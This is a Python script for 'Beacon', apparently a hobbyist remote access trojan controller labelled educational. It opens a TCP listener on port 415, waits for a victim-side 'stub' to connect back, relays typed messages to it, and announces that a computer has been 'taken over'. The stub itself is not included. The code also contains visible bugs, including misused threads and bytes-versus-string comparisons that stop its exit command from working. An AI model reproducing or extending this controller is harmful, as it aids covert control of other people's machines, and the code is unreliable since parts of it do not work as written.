import socket
import os
from threading import Thread
from colorama import Fore, Style
import colorama

def __main__():

    
    colorama.init()

           
    def clear_screen(): 
            """Clear the screen only"""
            if os.name == 'nt': 
                    os.system('cls') 
            else: 
                    os.system('clear')

    def stub():
        print("Lets assume you're Creating a Stub for Educational Purposes only.")
        print("To do this, Just Enter your IP Address in HOST Field in the STUB.")
        print("-- ] How to USE THE STUB AKA Beacon-Client.")
        print("- Execute Beacon Client.")
        print("- Enter IP of THIS System which is running Beacon Server. (Me)")
        print("- Press Enter.")
        input("")
        __main__()


    def start_server():
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        host = "0.0.0.0"
        port = 415

        try:
            server.bind((host, port))
        except Exception as e:
            print("[ - ] Error Binding : ", e)
            input("")
            exit(1)
        

        print("TCP : Transmission Control Protocol. IP : Internet Protocol")
        print("Listening connections. TCP allows a connection to listen for incoming connection requests.")

        try:
            print("Now Listening on Incoming Connections. Or more Easy, LRat Client will try and connect back to us (TCP/IP networking protocol that allows two computers to communicate).\n"+Fore.MAGENTA+"HOST : "+Style.RESET_ALL+ host+" and "+Fore.MAGENTA+"PORT : "+ str(port)+Style.RESET_ALL)
            server.listen(5)
        except Exception as etwo:
            print(Fore.RED+"[ - ] Error Listening : "+Style.RESET_ALL, etwo)
            input("")
            exit(1)
        

        clientsocket, addr = server.accept()
        print(Fore.LIGHTYELLOW_EX+"[ + ] Stub Connected : ", str(addr[0])+Style.RESET_ALL) 
        print(Fore.YELLOW+"[ ! ] Now. The Attack is Complete. You have successfully taken over an Computer.."+Style.RESET_ALL)       
        def recv():
            try:
                data = clientsocket.recv(1024)
                data = data.decode()
                if(data == ""):
                    pass
                else:
                    print(Fore.LIGHTGREEN_EX+"[MESSAGE]: "+Style.RESET_ALL, data)
            except Exception as e_tree:
                print("[ - ] Error : ", e_tree)
            
        
        def send():
            msg = input(Fore.LIGHTGREEN_EX+"[Remote Access Session@"+Style.RESET_ALL+str(addr[0])+Fore.LIGHTGREEN_EX+"]: "+Style.RESET_ALL)
            msg = msg.encode()
            if(msg == ''):
                pass
            elif(msg == "exit"):
                clientsocket.close()
                input("[ - ] Closing..")
                __main__()
            else:
                clientsocket.send(msg)

        while(True):
            try:
                Thread(target=send()).start()
                Thread(target=recv()).start()
            except Exception as i:
                print(Fore.RED+"[ - ] ERROR : ", i + Style.RESET_ALL)
                input("")
                __main__()
            


    clear_screen() # or CLS if Windows.
    try:
        user_file = open("user-info", "r")
        file_content = user_file.read()
    except FileNotFoundError:
        clear_screen()
        print("User Registration file not found. Are you sure you installed Correctly?")
        exit(1)

    print(Fore.LIGHTMAGENTA_EX+"--]"+Style.RESET_ALL+" ========================"+Fore.LIGHTMAGENTA_EX+" [--"+Style.RESET_ALL+"\n Beacon \n"+Fore.LIGHTMAGENTA_EX+"--]"+Style.RESET_ALL+" ======================== "+Fore.LIGHTMAGENTA_EX+"[ --"+Style.RESET_ALL)
    print(Fore.LIGHTCYAN_EX+"--] "+Style.RESET_ALL+"Author : Lynx")
    print(Fore.LIGHTGREEN_EX+ file_content + Style.RESET_ALL)
    print(Fore.LIGHTCYAN_EX+"--] "+Style.RESET_ALL+"I hope you learn something..\n\n")
    print(Fore.LIGHTCYAN_EX+" --] ----------------------------------------- [-- "+Style.RESET_ALL)
    print(Fore.LIGHTCYAN_EX+"|"+Style.RESET_ALL+" Beacon is a Remote Access Tool that Teaches you how"+Fore.LIGHTCYAN_EX+" |")
    print(Fore.LIGHTCYAN_EX+"|"+Style.RESET_ALL+" and why a Popular Malware 'rat' is used for. Also"+Fore.LIGHTCYAN_EX+" |")
    print(Fore.LIGHTCYAN_EX+"|"+Style.RESET_ALL+" how to exploit and how to avoid being Attacked."+Fore.LIGHTCYAN_EX+"   |")
    print(Fore.LIGHTCYAN_EX+" --] ----------------------------------------- [-- "+Style.RESET_ALL)

    
    main = input("[ ? ]: ")
    if(main == "help"):
        print("help - Print this Help Message.\nlisten - Start THINGS UP :D\nexit - Close.\nStub - Generate a Stub (details within)")
        input("")
        __main__()
    elif(main == "listen"):
        print("Listen for Incoming Connections.\nIt means that any Connection coming to us with port 415 will connect to us.\nThis is basic TCP/IP Connection.")
        start_server()
    elif(main == "exit"):
        print("[ i ] Okay Exiting. But I hope you learned something today.")
        exit(1)
    elif(main == "stub"):
        stub()
    else:
        input("[ - ] Unidentified. Type, help")
        __main__()
